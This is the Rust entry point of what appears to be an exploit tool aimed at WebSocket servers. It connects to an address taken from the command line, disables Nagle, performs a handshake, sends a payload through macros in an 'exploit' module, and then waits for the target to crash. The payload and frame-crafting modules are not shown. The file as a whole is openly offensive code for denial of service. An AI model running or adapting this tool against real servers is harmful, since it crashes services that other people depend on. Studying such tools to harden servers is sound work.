use std::{io::Read, net::TcpStream, process::exit, thread::sleep, time::Duration};

use log::{error, info};

use tungstenite::{connect, stream::MaybeTlsStream};

mod config;
mod exploit;
mod frame;
mod handshake;
mod payload;

use config::Args;

use clap::Parser;

use crate::handshake::Handshake;
use payload::Payload;

fn get_socket_addr() -> String {
    let args = Args::parse();

    if args.use_tungstenite {
        format!("{}://{}:{}", args.protocol, args.address, args.port)
    } else {
        format!("{}:{}", args.address, args.port)
    }
}

fn get_stream_tungstenite() -> MaybeTlsStream<TcpStream> {
    let socket_addr = get_socket_addr();

    info!("Connecting to {}", socket_addr);

    let (socket, _) = connect(socket_addr).unwrap_or_else(|f| {
        error!("Connection failed! Error: {f:?}");

        exit(0)
    });

    socket.into_inner()
}

fn get_stream() -> Box<TcpStream> {
    let socket_addr = get_socket_addr();

    info!("Connecting to {}", socket_addr);

    Box::new(TcpStream::connect(socket_addr).unwrap_or_else(|f| {
        error!("Connection failed! Error: {f:?}");

        exit(0)
    }))
}

fn main() {
    unsafe {
        std::env::set_var("RUST_LOG", "info");
    }

    env_logger::init();

    let args = Args::parse();

    if args.use_tungstenite {
        let stream = get_stream_tungstenite();

        match stream {
            MaybeTlsStream::NativeTls(mut stream) => {
                /*
                 * Options are already set
                 */

                let mutable = stream.get_mut();

                exploit::implementation::execute!(mutable);
            }
            MaybeTlsStream::Plain(stream) => {
                exploit::implementation::execute!(stream);
            }
            _ => unreachable!(),
        }
    } else {
        let stream = get_stream();

        info!("Connected! Passing away the socket (lmao what)");

        exploit::implementation::disable_nagle!(stream.try_clone().unwrap());
        exploit::implementation::increase_write_timeout!(stream.try_clone().unwrap());
        exploit::implementation::perform_handshake!(stream.try_clone().unwrap());
        exploit::implementation::wait_confirm!(stream.try_clone().unwrap());
        exploit::implementation::send_payload!(stream.try_clone().unwrap());
        exploit::implementation::wait_for_crash!(stream);
    }
}
